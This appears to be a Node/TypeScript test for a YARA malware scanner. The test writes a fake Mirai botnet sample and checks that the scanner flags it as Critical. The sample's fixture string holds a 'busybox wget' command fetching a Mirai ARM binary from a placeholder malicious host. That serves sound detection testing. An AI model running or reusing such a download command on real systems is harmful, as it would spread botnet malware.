import assert from "node:assert";
import { mkdtemp, writeFile, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { scanWithYara } from "./scanner";

export async function runYaraScannerTests() {
  console.log("▶ Running YARA Scanner Tests...");

  const testDir = await mkdtemp(join(tmpdir(), "yara-test-"));

  try {
    // 1. Create a file with Mirai botnet strings
    const miraiPath = join(testDir, "botnet_sample.sh");
    await writeFile(miraiPath, "#!/bin/sh\nbusybox wget http://malicious.host/mirai.arm7\nPOST /cdn-cgi/\n");

    // 2. Create a file with benign content
    const benignPath = join(testDir, "normal.txt");
    await writeFile(benignPath, "Hello world, this is a clean file.");

    const matches = await scanWithYara(testDir);
    assert(matches.length > 0, "Expected YARA scanner to detect Mirai botnet strings");

    const miraiMatch = matches.find((m) => m.ruleId === "YARA_MIRAI_STRINGS");
    assert(miraiMatch, "Expected YARA_MIRAI_STRINGS rule to trigger");
    assert.strictEqual(miraiMatch.severity, "Critical");

    console.log("✔ YARA Scanner Tests Passed!");
  } finally {
    await rm(testDir, { recursive: true, force: true }).catch(() => {});
  }
}

export { runYaraScannerTests as run };

if (process.argv[1] && import.meta.url.endsWith(process.argv[1].replace(/\\/g, "/"))) {
  runYaraScannerTests().catch((err) => {
    console.error("✖ YARA Scanner Tests Failed:", err);
    process.exit(1);
  });
}
